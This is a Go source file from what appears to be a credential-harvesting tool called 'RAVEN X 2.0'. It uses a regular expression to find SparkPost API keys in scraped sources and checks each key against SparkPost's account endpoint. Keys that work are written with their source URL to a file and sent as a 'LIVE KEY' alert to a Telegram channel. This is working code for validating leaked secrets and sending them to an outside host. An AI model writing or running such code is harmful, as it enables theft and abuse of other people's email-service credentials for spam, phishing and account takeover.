package main

import (
	"fmt"
	"net/http"
	"regexp"
)

// SparkPost API keys are 40-character alphanumeric strings. TruffleHog production
// detector uses [a-zA-Z0-9]{40} — hex-only was confirmed wrong by real key examples.
// Covers SPARKPOST_API_KEY (canonical SDK env var), SPARKPOST_APIKEY (CLI variant),
// SPARKPOST_KEY and bare sparkpost key context.
var sparkpostPattern = regexp.MustCompile(`(?i)(?:SPARKPOST_API_KEY|SPARKPOST_APIKEY|sparkpost[_\-]?(?:api[_\-]?)?key|SPARKPOST_KEY)["'\s:=]+([a-zA-Z0-9]{40})`)

// CheckSparkPost validates a SparkPost API key against the /account endpoint.
// 200 = key is valid for the account; anything else = not confirmed.
func (a *AWSScanner) CheckSparkPost(key, sourceURL string) bool {
	if !a.Config.APIValidation.SparkPost {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.sparkpost.com/api/v1/account", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Authorization", key)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("SparkPost", fmt.Sprintf("Key: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_sparkpost.txt")
		a.storeValidKeyLimit("SparkPost", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
⚡ <b>SPARKPOST LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}
